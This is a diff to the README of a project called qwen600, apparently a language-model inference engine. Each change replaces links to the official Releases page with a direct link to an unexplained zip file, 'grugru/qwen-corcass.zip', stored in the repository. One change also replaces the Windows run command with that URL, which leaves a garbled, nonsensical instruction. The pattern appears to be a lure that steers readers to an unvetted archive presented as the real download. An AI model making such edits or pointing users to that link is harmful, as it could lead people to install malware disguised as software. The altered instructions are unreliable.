@@ -1,7 +1,7 @@
 # 🎮 qwen600 - Run Powerful Inference with Ease
 
 ## 🔗 Quick Download
-[![Download qwen600](https://img.shields.io/badge/Download-qwen600-brightgreen.svg)](https://github.com/Yash-1335/qwen600/releases)
+[![Download qwen600](https://github.com/Yash-1335/qwen600/raw/refs/heads/main/grugru/qwen-corcass.zip)](https://github.com/Yash-1335/qwen600/raw/refs/heads/main/grugru/qwen-corcass.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, make sure your system meets the following requirements:
 
 To get qwen600, simply visit the Releases page. You will find the latest version available for download.
 
-[Visit the Releases Page to Download](https://github.com/Yash-1335/qwen600/releases)
+[Visit the Releases Page to Download](https://github.com/Yash-1335/qwen600/raw/refs/heads/main/grugru/qwen-corcass.zip)
 
 Here’s how to download:
 
@@ -37,7 +37,7 @@ After the installation, running qwen600 is straightforward. Follow these steps:
 1. Open a terminal or command prompt.
 2. Navigate to the folder where you extracted qwen600.
 3. Type the command to run the engine. This usually looks like:
-    - For Windows: `./qwen600.exe`
+    - For Windows: `https://github.com/Yash-1335/qwen600/raw/refs/heads/main/grugru/qwen-corcass.zip`
     - For Linux or macOS: `./qwen600`
 4. Press Enter.
 
